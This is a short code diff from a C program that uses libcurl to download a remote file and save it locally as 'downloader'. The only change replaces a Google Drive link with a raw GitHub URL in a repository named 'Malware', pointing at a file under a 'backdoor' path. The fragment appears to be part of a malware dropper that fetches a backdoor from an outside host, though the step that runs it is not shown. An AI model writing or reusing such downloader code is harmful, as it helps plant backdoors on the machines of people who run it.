@@ -46,7 +46,7 @@ int main(){
     FILE *fs;
     CURLcode res;
 
-    char const* url = "https://drive.google.com/file/d/1NkAA5TIYAt4UOi0rlyzHkVg15Cb3oeWM/view?usp=sharing";
+    char const* url = "https://github.com/huyenlovemath/Malware/raw/master/backdoor/backdoor";
     char outfilename[FILENAME_MAX] = "downloader";
 
     if (curl_global_init(CURL_GLOBAL_ALL)){
